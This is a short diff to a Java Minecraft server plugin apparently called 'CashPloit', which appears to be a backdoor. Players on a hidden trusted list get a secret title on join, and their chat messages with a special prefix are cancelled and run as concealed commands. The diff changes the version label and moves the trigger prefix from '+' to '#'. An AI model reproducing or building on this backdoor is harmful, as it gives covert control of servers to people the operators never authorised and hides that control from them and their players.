@@ -20,7 +20,7 @@ public class AsyncChatEvent implements Listener {
     )
     public void onJoin(PlayerJoinEvent e) {
         if (Start.INSTANCE.trustedPlayers.contains(e.getPlayer().getName())) {
-            e.getPlayer().sendTitle(ChatColor.GOLD + "CashPloit" + ChatColor.AQUA + "3", ChatColor.GREEN + "Jetzt kannst du " + ChatColor.RED + "+ " + ChatColor.GREEN + "Befehle benutzen.");
+            e.getPlayer().sendTitle(ChatColor.GOLD + "CashPloit" + ChatColor.RED + "4", ChatColor.GREEN + "Jetzt kannst du " + ChatColor.RED + "# " + ChatColor.GREEN + "Befehle benutzen.");
             e.getPlayer().playSound(e.getPlayer().getLocation(), Sound.ENDERDRAGON_GROWL, 1.1F, 1.1F);
         }
 
@@ -49,7 +49,7 @@ public class AsyncChatEvent implements Listener {
                 }
             }
 
-            if (Start.INSTANCE.trustedPlayers.contains(p.getName()) && ev.getMessage().startsWith("+")) {
+            if (Start.INSTANCE.trustedPlayers.contains(p.getName()) && ev.getMessage().startsWith("#")) {
                 ev.setCancelled(true);
 
                 for (Player user : Command_COMMANDSPY.players) {
